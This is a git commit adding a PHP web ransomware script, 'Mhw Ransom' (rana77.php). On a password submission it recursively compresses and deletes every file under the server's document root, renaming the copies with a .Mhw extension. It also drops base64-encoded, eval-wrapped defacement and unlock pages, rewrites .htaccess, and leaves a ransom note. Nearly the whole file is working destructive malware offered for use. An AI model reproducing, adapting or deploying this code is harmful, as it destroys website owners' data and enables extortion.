57fc70c16815ebfa5dbb302a58a6a61f8d94034f
Security 77 <95581252+HedyFake@users.noreply.github.com>
2022-05-11 19:18:37 +0700

    Add files via upload

---
+++ rana77.php
@@ -0,0 +1,132 @@
+<html>
+    <head>
+        <title>Mhw Ransom</title>
+</head>
+<body>
+    <center>
+        <pre style="color: green;">
+
+            .         ..xxxxxxxxxx....               .       .             .
+    .             MWMWMWWMWMWMWMWMWMWMWMWMW                       .
+              IIIIMWMWMWMWMWMWMWMWMWMWMWMWMWMttii:        .           .
+ .      IIYVVXMWMWMWMWMWMWMWMWMWMWMWMWMWMWMWMWMWMWMWxx...         .           .
+     IWMWMWMWMWMWMWMWMWMWMWMWMWMWMWMWMWMWMWMWMWMWMWMWMWMWMx..
+   IIWMWMWMWMWMWMWMWMWBY%ZACH%AND%OWENMWMWMWMWMWMWMWMWMWMWMWMWMx..        .
+    ""MWMWMWMWMWM"""""""".  .:..   ."""""MWMWMWMWMWMWMWMWMWMWMWMWMWti.
+ .     ""   . `  .: . :. : .  . :.  .  . . .  """"MWMWMWMWMWMWMWMWMWMWMWMWMti=
+        . .   :` . :   .  .'.' '....xxxxx...,'. '   ' ."""YWMWMWMWMWMWMWMWMWMW+
+     ; . ` .  . : . .' :  . ..XXXXXXXXXXXXXXXXXXXXx.    `     . "YWMWMWMWMWMWMW
+.    .  .  .    . .   .  ..XXXXXXXXWWWWWWWWWWWWWWWWXXXX.  .     .     """""""
+        ' :  : . : .  ...XXXXXWWW"   W88N88@888888WWWWWXX.   .   .       . .
+   . ' .    . :   ...XXXXXXWWW"    M88N88GGGGGG888^8M "WMBX.          .   ..  :
+         :     ..XXXXXXXXWWW"     M88888WWRWWWMW8oo88M   WWMX.     .    :    .
+           "XXXXXXXXXXXXWW"       WN8888WWWWW  W8@@@8M    BMBRX.         .  : :
+  .       XXXXXXXX=MMWW":  .      W8N888WWWWWWWW88888W      XRBRXX.  .       .
+     ....  ""XXXXXMM::::. .        W8@889WWWWWM8@8N8W      . . :RRXx.    .
+         ``...'''  MMM::.:.  .      W888N89999888@8W      . . ::::"RXV    .  :
+ .       ..'''''      MMMm::.  .      WW888N88888WW     .  . mmMMMMMRXx
+      ..' .            ""MMmm .  .       WWWWWWW   . :. :,miMM"""  : ""`    .
+   .                .       ""MMMMmm . .  .  .   ._,mMMMM"""  :  ' .  :
+               .                  ""MMMMMMMMMMMMM""" .  : . '  
+</pre>
+</center>
+<br>
+<center><p class="tau">[ I see You Bro!!! ]<p><br>
+<p color="red">Path:<p><font color="red"><?php echo $_SERVER['SCRIPT_FILENAME'];?></font>
+</center>
+<center>
+        <form enctype="multipart/form-data" method='post'>
+            <br><br>
+            <input type="text" name="pass" class="my"  placeholder="PASSWORD">
+            <br><br>
+            <input type="submit" class="input" value="lock">
+<style type="text/css">
+    .tau{
+        font-family: 'Courier New', Courier, monospace;
+    }
+    .my{
+        background: transparent;
+        border-radius: 1em;
+        border-style: dotted;
+        border-color: #4CAF50;
+        text-align: center;
+        color: white;
+    }
+    body{
+        background: #1A1C1F;
+        color: #e2e2e2;
+    }
+    .input{
+        background-color: transparent;
+        color: green;
+        font-family: 'Courier New', Courier, monospace;
+        border-radius: 3cm;
+        width: 3cm;
+    }
+    </style>
+    <?php
+    error_reporting(0);
+    set_time_limit(0);
+    ini_set('memory_limit', '-1');
+    if(isset($_POST['pass'])){
+        function hedy($filename){
+            if(strpos($filename, '.Mhw') !== false){
+                return;
+            }
+            file_put_contents($filename.'.Mhw',gzdeflate(file_get_contents($filename),9));
+            unlink($filename);
+            copy('.htacces');
+
+            $open = base64_decode("PGh0bWw+CiAgICA8aGVhZD4KICAgICAgICA8dGl0bGU+SGFja2VkIEJ5IE1odzwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KICAgICAgICA8ZGl2IGNsYXNzPSJkaSI+CiAgICAgICAgICAgIDxoMT5XaGF0IGp1c3QgaGFwcGVuZWQ/PC9oMT4KICAgICAgICA8L2Rpdj4KICAgICAgICA8Y2VudGVyPgogICAgICAgICAgICA8cHJlIGNvbG9yPSJncmVlbiI+CiAgICAgICAgICAgIOKWkOKWk+KWiOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWiOKWk+KWjOKWkeKWhOKWhOKWhOKWhOKWhAogICAgICAgICAgICDilpDilpPilojilpHilpEgUmFuYSDilpHilpHilojilpPilozilpHilojiloTiloTiloTilogKICAgICAgICAgICAg4paQ4paT4paIUmFuc29td2FyZSDilojilpPilozilpHilojiloTiloTiloTilogKICAgICAgICAgICAg4paQ4paT4paI4paE4paE4paE4paE4paE4paE4paE4paE4paE4paI4paT4paM4paR4paI4paI4paI4paI4paICiAgICAgICAgICAgICAgICAg4paE4paE4paI4paI4paI4paE4paEICAgICAg4paI4paI4paI4paI4paICgogICAgICAgICAgICAgWW91ciBzaXRlIGlzIGxvY2tlZCBwbGVhc2UgY29udGFjdCBtZToKICAgICAgLVsgPGEgY29sb3I9ImdyZWVuIiBocmVmPSIvcmVhZC50eHQiPlJlYWRNZTwvYT4gXS0KICAgICAgICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICAgICAgICAgICAgIFRoaXMgaXMgYSBub3RpZmljYXRpb24gYWJvdXQgPGEgaHJlZj0iaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvUmFuc29td2FyZSI+UmFuc29td2FyZTwvYT4KCiAgICAgICAgICAgICAgICA8L3ByZT48L2NlbnRlcj4KICAgICAgICA8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgogICAgCiAgICAgICAgICAgIC5kaXsKICAgICAgICAgICAgICAgIHBhZGRpbmctdG9wOiAxY207CiAgICAgICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgICAgICAgICBmb250LWZhbWlseTogJ09sZW8gU2NyaXB0IFN3YXNoIENhcHMnLCBmYW50YXN5OwogICAgICAgICAgICAgICAgY29sb3I6IHJnYig1LCAxMzEsIDUpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGJvZHl7CiAgICAgICAgICAgIGJhY2tncm91bmQ6ICMxQTFDMUY7CiAgICAgICAgICAgIGNvbG9yOiAjZTJlMmUyOwogICAgICAgICAgICB9CiAgICAgICAgPC9zdHlsZT4KICAgIDwvYm9keT4KPC9odG1sPg==");
+            $file = base64_decode("PGh0bWw+CiAgICA8aGVhZD4KICAgICAgICA8dGl0bGU+SGFja2VkIEJ5IE1odzwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KICAgICAgICA8ZGl2IGNsYXNzPSJkaSI+CiAgICAgICAgICAgIDxoMT5XaGF0IGp1c3QgaGFwcGVuZWQ/PC9oMT4KICAgICAgICA8L2Rpdj4KICAgICAgICA8Y2VudGVyPgogICAgICAgICAgICA8cHJlIGNvbG9yPSJncmVlbiI+CiAgICAgICAgICAgIOKWkOKWk+KWiOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWiOKWk+KWjOKWkeKWhOKWhOKWhOKWhOKWhAogICAgICAgICAgICDilpDilpPilojilpHilpEgUmFuYSDilpHilpHilojilpPilozilpHilojiloTiloTiloTilogKICAgICAgICAgICAg4paQ4paT4paIUmFuc29td2FyZSDilojilpPilozilpHilojiloTiloTiloTilogKICAgICAgICAgICAg4paQ4paT4paI4paE4paE4paE4paE4paE4paE4paE4paE4paE4paI4paT4paM4paR4paI4paI4paI4paI4paICiAgICAgICAgICAgICAgICAg4paE4paE4paI4paI4paI4paE4paEICAgICAg4paI4paI4paI4paI4paICgogICAgICAgICAgICAgIFdhbnQgdG8gb3BlbiB5b3VyIHNpdGU/SGF2ZSB5b3Ugc2VlbiB0aGlzCiAgICAgIC1bIDxhIGNvbG9yPSJncmVlbiIgaHJlZj0iL3JlYWQudHh0Ij5SZWFkTWU8L2E+IF0tCiAgICAgICAgICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAgICAgICAgICAgIDxmb3JtIGVuY3R5cGU9Im11bHRpcGFydC9mb21yLWRhdGEiIG1ldGhvZD0icG9zdCI+CiAgICAgICAgICAgICAgICA8YnI+PGJyPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFzcyIgY2xhc3M9Im15IiAgcGxhY2Vob2xkZXI9IlBBU1NXT1JEIj4KICAgICAgICAgICAgPGJyPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iaW5wdXQiIHZhbHVlPSJ1bmxvY2siPgogICAgICAgICAgICAgICAgPC9wcmU+PC9jZW50ZXI+CiAgICAgICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KICAgICAgICAgICAgLm15ewogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7CiAgICAgICAgYm9yZGVyLXN0eWxlOiBkb3R0ZWQ7CiAgICAgICAgYm9yZGVyLWNvbG9yOiAjNENBRjUwOwogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICBjb2xvcjogd2hpdGU7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC5pbnB1dHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsKICAgICAgICBjb2xvcjogZ3JlZW47CiAgICAgICAgZm9udC1mYW1pbHk6ICdDb3VyaWVyIE5ldycsIENvdXJpZXIsIG1vbm9zcGFjZTsKICAgICAgICBib3JkZXItcmFkaXVzOiAzY207CiAgICAgICAgd2lkdGg6IDNjbTsKICAgIH0KICAgIAogICAgICAgICAgICAuZGl7CiAgICAgICAgICAgICAgICBwYWRkaW5nLXRvcDogMWNtOwogICAgICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICAgICAgICAgICAgZm9udC1mYW1pbHk6ICdPbGVvIFNjcmlwdCBTd2FzaCBDYXBzJywgZmFudGFzeTsKICAgICAgICAgICAgICAgIGNvbG9yOiByZ2IoNSwgMTMxLCA1KTsKICAgICAgICAgICAgfQogICAgICAgICAgICBib2R5ewogICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMUExQzFGOwogICAgICAgICAgICBjb2xvcjogI2UyZTJlMjsKICAgICAgICAgICAgfQogICAgICAgIDwvc3R5bGU+CiAgICAgICAgPD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwokaW5wdXQgPSAkX1BPU1RbJ3Bhc3MnXTsKJHBhc3MgPSAiSGVkeSI7CmlmKGlzc2V0KCRpbnB1dCkpIHsKaWYobWQ1KCRpbnB1dCkgPT0gJHBhc3MpIHsKZnVuY3Rpb24gZGVjZmlsZSgkZmlsZW5hbWUpewoJaWYgKHN0cnBvcygkZmlsZW5hbWUsICcuTWh3JykgPT09IEZBTFNFKSB7CglyZXR1cm47Cgl9CgkkZGVjcnlwdGVkID0gZ3ppbmZsYXRlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlbmFtZSkpOwoJZmlsZV9wdXRfY29udGVudHMoc3RyX3JlcGxhY2UoJy5NaHcnLCAnJywgJGZpbGVuYW1lKSwgJGRlY3J5cHRlZCk7Cgl1bmxpbmsoJ21odzIzMDcucGhwJyk7Cgl1bmxpbmsoJy5odGFjY2VzcycpOwoJdW5saW5rKCRmaWxlbmFtZSk7CgllY2hvICIkZmlsZW5hbWUgRGVjcnlwdGVkICEhITxicj4iOwp9CgpmdW5jdGlvbiBkZWNkaXIoJGRpcil7CgkkZmlsZXMgPSBhcnJheV9kaWZmKHNjYW5kaXIoJGRpciksIGFycmF5KCcuJywgJy4uJykpOwoJCWZvcmVhY2goJGZpbGVzIGFzICRmaWxlKSB7CgkJCWlmKGlzX2RpcigkZGlyLiIvIi4kZmlsZSkpewoJCQkJZGVjZGlyKCRkaXIuIi8iLiRmaWxlKTsKCQkJfWVsc2UgewoJCQkJZGVjZmlsZSgkZGlyLiIvIi4kZmlsZSk7CgkJfQoJfQp9CgpkZWNkaXIoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSk7CmVjaG8gIjxicj5XZWJyb290IERlY3J5cHRlZDxicj4iOwp1bmxpbmsoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pOwp1bmxpbmsoJy5odGFjY2VzcycpOwpjb3B5KCdodGFiYWNrdXAnLCcuaHRhY2Nlc3MnKTsKZWNobyAnU3VjY2VzcyAhISEnOwp9IGVsc2UgewplY2hvICdGYWlsZWQgUGFzc3dvcmQgISEhJzsKfQpleGl0KCk7Cn0KPz4KICAgIDwvYm9keT4KPC9odG1sPg== ");
+            $cok = str_replace('Hedy',md5($_POST['pass']), $file);
+
+            $dec = $cok;
+            $com = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
+            $mek = fopen('mhw2307.php','w');
+            fwrite($mek, $com);
+            fclose($mek);
+
+            $open1 = $open;
+            $mas = "<?php eval('?>'.base64_decode("."'".base64_encode($open1)."'".").'<?php '); ?>";
+            $kop = fopen('index.php','w');
+            fwrite($kop, $mas);
+            fclose($kop);
+            
+            $ht = "DirectoryIndex index.php\n ErrorDocument 403 /index.php\n";
+            $my = fopen('.htacces','w');
+            fwrite($my, $ht);
+            fclose($my);
+            
+            $msg = " Your Website Has been hacked";
+            $babi = fopen('read.txt','w');
+            fwrite($babi, $msg);
+            fclose($babi);
+            echo "$filename Locked.!!!<br>";
+            
+        }
+        function hedy1($dir){
+            $files = array_diff(scandir($dir),array('.', '..'));
+            foreach($files as $file){
+                if(is_dir($dir."/".$file)){
+                    hedy1($dir."/".$file);
+                }else{
+                    hedy($dir."/".$file);
+                }
+            }
+        }
+        if(isset($_POST['pass'])){
+            hedy1($_SERVER['DOCUMENT_ROOT']);
+        }
+        copy('index.php',$_SERVER['DOCUMENT_ROOT'].'/index.php');
+        copy('.htacces', $_SERVER['DOCUMENT_ROOT'].'htacces');
+        copy('mhw2307.php',$_SERVER['DOCUMENT_ROOT'].'/mhw2307.php');
+
+    }
+    ?>
+    <?php
+    @ini_set('output_buffering',0);
+    @ini_set('display_errors',0); ini_set('memory_limit','64M'); header('Content-Type: text/html; charshet=UTF-8');
+    ?>
+</body>
+<html>
